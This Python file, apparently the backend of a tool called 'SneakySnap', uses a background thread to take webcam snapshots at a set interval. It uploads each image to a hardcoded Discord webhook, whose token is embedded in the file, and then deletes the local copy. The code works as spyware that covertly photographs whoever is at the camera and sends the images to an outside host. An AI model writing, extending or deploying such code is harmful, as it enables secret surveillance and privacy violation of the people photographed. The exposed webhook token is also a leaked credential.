import cv2
import requests
import time
import os
import threading
import logging
from datetime import datetime

WEBHOOK_URL = "https://discord.com/api/webhooks/1349839624733986928/cL7qDWq_a7xedEwrnENU6DXLtdfl3DuwsI9XoPuXFN0zuxdxnrzkMLz_875ASiEw5w6I"

logging.basicConfig(
    filename="SneakySnap.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

class SneakySnapBackend:
    def __init__(self, log_callback):
        self.running = False
        self.cam = None
        self.log_callback = log_callback
        self.log("Backend initialized.")

    def log(self, message, level="INFO"):
        log_entry = f"{message}"
        if level == "INFO":
            logging.info(log_entry)
        elif level == "ERROR":
            logging.error(log_entry)
        self.log_callback(log_entry)

    def capture_loop(self, delay):
        while self.running:
            if not self.cam or not self.cam.isOpened():
                self.log("Webcam unavailable or not initialized.", "ERROR")
                self.stop_capture()
                return

            ret, frame = self.cam.read()
            if not ret:
                self.log("Failed to capture image from webcam.", "ERROR")
                self.stop_capture()
                return

            photo_path = "snapshot_temp.jpg"
            cv2.imwrite(photo_path, frame)
            self.log(f"Image captured successfully at {datetime.now().strftime('%H:%M:%S')}.")

            try:
                with open(photo_path, "rb") as f:
                    files = {"file": (photo_path, f, "image/jpeg")}
                    data = {"content": "Photo captured and sent."}
                    response = requests.post(WEBHOOK_URL, data=data, files=files)
                    if response.status_code == 204:
                        self.log("Image successfully sent to Discord webhook.")
                    else:
                        self.log(f"Webhook request failed: {response.status_code} - {response.text}", "ERROR")
            except Exception as e:
                self.log(f"Error sending to webhook: {str(e)}", "ERROR")

            if os.path.exists(photo_path):
                os.remove(photo_path)
                self.log("Temporary image file removed.")

            time.sleep(delay)

    def start_capture(self, delay):
        if not self.running:
            self.running = True
            self.log(f"Starting capture with {delay}-second delay.")
            self.cam = cv2.VideoCapture(0)
            if not self.cam.isOpened():
                self.log("Webcam not detected or accessible.", "ERROR")
                self.running = False
                return

            self.capture_thread = threading.Thread(target=self.capture_loop, args=(delay,))
            self.capture_thread.daemon = True
            self.capture_thread.start()

    def stop_capture(self):
        if self.running:
            self.running = False
            if self.cam:
                self.cam.release()
                self.log("Webcam released and capture stopped.")
            else:
                self.log("Capture stopped.")